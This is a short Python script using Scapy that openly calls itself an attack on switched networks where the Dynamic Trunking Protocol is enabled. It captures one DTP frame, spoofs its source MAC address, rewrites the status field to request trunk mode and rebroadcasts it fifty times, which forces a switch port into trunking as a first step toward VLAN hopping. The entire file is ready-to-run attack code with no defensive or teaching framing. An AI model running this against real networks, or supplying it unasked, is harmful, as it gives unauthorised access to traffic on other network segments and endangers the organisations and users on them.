#!/usr/bin/env python3.11
""" Best Way To Predict The Future, Is To Create It
	Abraham Lincoln

	This Script Attack Mess-Configured Network Which Use DTP-Enabled
	"""

from scapy.all import *
from time import sleep

from scapy.contrib.dtp import DTP, DTPStatus

# Load DTP contributed to help read DTP messages packets .
load_contrib("dtp")

# Capture DTP-Message Packet .
# will know DTP-MAC address "01:00:0c:cc:cc:cc" .
sniffed_pkt = sniff(filter="ether dst 01:00:0c:cc:cc:cc", count=1)

# Change the MAC address in the packet to this mac address .
sniffed_pkt[0].src = "00:00:00:11:11:11"

# Change to desirable , change the response of the another interface status to be "trunk", because the operational mode = static access in case of "dynamic auto".
sniffed_pkt[0][DTP][DTPStatus].status = "\x03"

# Send modified DTP-Message Packet to target-network .
# Loop then wait to 20 seconds , to force the changes to be much longer in the target-network .
for _ in range(50):
    sendp(sniffed_pkt[0], loop=0, verbose=True)
    sleep(20)
